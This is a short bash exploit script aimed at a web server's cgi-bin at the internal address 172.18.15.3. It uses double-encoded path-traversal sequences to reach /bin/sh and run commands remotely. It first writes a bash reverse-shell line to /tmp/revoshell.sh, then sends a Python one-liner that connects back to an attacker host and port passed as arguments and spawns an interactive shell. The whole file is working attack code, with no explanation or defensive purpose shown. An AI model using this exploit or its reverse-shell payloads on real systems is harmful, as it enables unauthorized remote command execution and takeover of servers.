#!/bin/bash

HOST=$1
PORT=$2

curl -v "http://172.18.15.3:80/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; echo '/bin/sh -i >& /dev/tcp/$1/$2 0>&1' > /tmp/revoshell.sh" && curl -v "http://172.18.15.3:80/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(($1,$2));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"


